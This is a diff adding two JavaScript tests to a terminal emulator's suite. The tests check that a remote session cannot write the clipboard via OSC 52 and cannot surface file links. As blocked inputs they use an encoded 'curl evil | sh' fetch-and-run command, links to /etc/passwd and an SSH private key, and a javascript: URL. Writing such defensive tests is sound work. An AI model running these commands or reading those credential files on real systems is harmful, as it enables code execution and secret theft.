@@ -655,3 +655,39 @@ test('clicking without the modifier keeps the destination in the hint', () => {
     interactions.dispose();
   }
 });
+
+test('a remote terminal never writes the clipboard from its output, even right after a copy gesture', async () => {
+  const oldNavigator = Object.getOwnPropertyDescriptor(globalThis, 'navigator');
+  const writes = [];
+  Object.defineProperty(globalThis, 'navigator', { configurable: true, value: { clipboard: { write: async (i) => { writes.push(i); }, writeText: async (t) => { writes.push(t); } } } });
+  const doc = new FakeEventTarget();
+  const h = terminalHarness(doc);
+  const interactions = attachTerminalInteractions({ term: h.term, host: h.host, applicationClipboardShortcuts: true, oscClipboard: false });
+  try {
+    h.key(key({ key: 'c', code: 'KeyC', ctrlKey: true }));
+    assert.equal(h.osc52(`;${Buffer.from('curl evil | sh').toString('base64')}`), true, 'the sequence is consumed');
+    await new Promise((r) => setTimeout(r, 0));
+    assert.deepEqual(writes, [], 'no clipboard write from a peer-controlled stream');
+  } finally {
+    interactions.dispose();
+    if (oldNavigator) Object.defineProperty(globalThis, 'navigator', oldNavigator); else delete globalThis.navigator;
+  }
+});
+
+test('a remote terminal offers no file links: no download hint, no visible-path provider', () => {
+  const downloaded = [];
+  const { harness, statuses, interactions, links } = linkHarness({ fileDownloads: false, downloadFile: (p) => downloaded.push(p) });
+  try {
+    links.hover({}, 'file:///etc/passwd');
+    assert.equal(statuses.at(-1), 'blocked unsafe link');
+    links.activate({ ctrlKey: true }, '/home/me/.ssh/id_ed25519');
+    assert.deepEqual(downloaded, []);
+    assert.equal(harness.linkProvider(), null, 'visible paths are not turned into links');
+    links.hover({}, 'https://example.com/docs');
+    assert.match(statuses.at(-1), /Ctrl\/Cmd-click → https:\/\/example\.com\/docs/, 'http(s) links still work');
+    links.hover({}, 'javascript:alert(1)');
+    assert.equal(statuses.at(-1), 'blocked unsafe link');
+  } finally {
+    interactions.dispose();
+  }
+});
